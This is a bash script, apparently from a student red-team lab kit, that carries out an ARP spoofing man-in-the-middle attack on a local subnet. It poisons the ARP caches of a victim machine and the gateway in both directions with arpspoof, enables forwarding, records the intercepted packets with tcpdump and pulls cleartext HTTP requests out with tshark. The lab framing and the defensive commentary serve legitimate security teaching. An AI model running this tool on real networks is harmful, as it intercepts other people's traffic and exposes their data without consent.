#!/bin/bash
# attack3_arpspoof.sh - ARP cache poisoning (MitM) within the red-team subnet.
#
# Why this is the "advanced attacker" cornerstone of your threat model:
#   This attack operates at LAYER 2. It happens entirely within the
#   broadcast domain 10.0.1.0/24 so the router and its iptables rules
#   never see this traffic, because the attacker is impersonating the
#   gateway TO THE SECONDARY VICTIM and impersonating the secondary
#   victim TO THE GATEWAY.
#
#   The blue team's perimeter firewall is therefore structurally unable
#   to block it. Snort's arpspoof preprocessor SHOULD detect it, but
#   detection != prevention. This is exactly the kind of residual risk
#   the rubric wants you to surface.
#
# Demo prerequisites:
#   - A second machine on 10.0.1.0/24 with IP $SECONDARY_VICTIM_IP.
#     (One of your group members can run a second Kali or Ubuntu VM.)
#   - The secondary victim runs `curl http://example.com/` while the
#     attack is live, and you capture the cleartext request.

source "$(dirname "$0")/config.sh"
require_root

# Required tools check
for tool in arpspoof tcpdump tshark; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        warn "$tool is not installed. On Kali: sudo apt install -y dsniff tshark"
        exit 1
    fi
done

OUT="$EVIDENCE_DIR/attack3_arpspoof_$TIMESTAMP"
mkdir -p "$OUT"

banner "ATTACK 3 - ARP SPOOFING / MAN-IN-THE-MIDDLE"
echo "Attacker iface  : $ATTACKER_IFACE"
echo "Gateway being impersonated : $GATEWAY_IP"
echo "Victim being targeted      : $SECONDARY_VICTIM_IP"
echo "Evidence dir               : $OUT"
echo
warn "This attack only works on a real Layer-2 segment. Do NOT run on production."
echo "Press Ctrl-C within 5 seconds to abort..."
sleep 5

# --- Step 1: Enable IP forwarding on the attacker --------------------------
step "Enabling IP forwarding on the attacker (so the MitM is transparent)"
sysctl -w net.ipv4.ip_forward=1 | tee "$OUT/01_ip_forward.txt"
echo

# --- Step 2: Capture the BEFORE state of the victim's ARP cache (manual) ---
step "On the secondary victim ($SECONDARY_VICTIM_IP), run BEFORE attack:"
echo "    arp -n | grep $GATEWAY_IP"
echo "Save the MAC address shown, it should be the REAL gateway MAC."
echo "Press ENTER once you've recorded it..."
read -r

# --- Step 3: Start packet capture in background ----------------------------
step "Starting tcpdump on $ATTACKER_IFACE (will capture intercepted traffic)"
PCAP="$OUT/02_intercepted_traffic.pcap"
tcpdump -i "$ATTACKER_IFACE" -w "$PCAP" 'not arp' >/dev/null 2>&1 &
TCPDUMP_PID=$!
sleep 1
ok "tcpdump PID: $TCPDUMP_PID, writing to $PCAP"
echo

# --- Step 4: Bidirectional ARP poisoning -----------------------------------
step "Starting bidirectional ARP poisoning (will run for 60 seconds)"
step "Tell secondary victim to make some HTTP requests now."
arpspoof -i "$ATTACKER_IFACE" -t "$SECONDARY_VICTIM_IP" "$GATEWAY_IP" \
    > "$OUT/03_arpspoof_to_victim.log" 2>&1 &
SPOOF1_PID=$!
arpspoof -i "$ATTACKER_IFACE" -t "$GATEWAY_IP" "$SECONDARY_VICTIM_IP" \
    > "$OUT/04_arpspoof_to_gateway.log" 2>&1 &
SPOOF2_PID=$!

ok "arpspoof PIDs: $SPOOF1_PID, $SPOOF2_PID"
echo
step "Attack running... let it run for 60s (or until you've captured what you need)."
sleep 60

# --- Step 5: Stop the attack -----------------------------------------------
step "Stopping arpspoof and tcpdump"
kill "$SPOOF1_PID" "$SPOOF2_PID" 2>/dev/null
wait "$SPOOF1_PID" "$SPOOF2_PID" 2>/dev/null
sleep 1
kill -INT "$TCPDUMP_PID" 2>/dev/null
wait "$TCPDUMP_PID" 2>/dev/null

# --- Step 6: Show the AFTER state of the victim's ARP cache (manual) -------
step "On the secondary victim ($SECONDARY_VICTIM_IP), run AFTER attack:"
echo "    arp -n | grep $GATEWAY_IP"
echo "The MAC should now be the ATTACKER's MAC -- proof of poisoning."
ip link show "$ATTACKER_IFACE" | grep ether | tee "$OUT/05_attacker_mac.txt"
echo

# --- Step 7: Summarise captured traffic ------------------------------------
step "Extracting HTTP traffic from the capture"
tshark -r "$PCAP" -Y "http.request" \
       -T fields -e frame.time -e ip.src -e ip.dst -e http.host -e http.request.uri \
       2>/dev/null | tee "$OUT/06_captured_http.txt"
echo

ok "ARP spoof attack complete. Evidence in: $OUT"
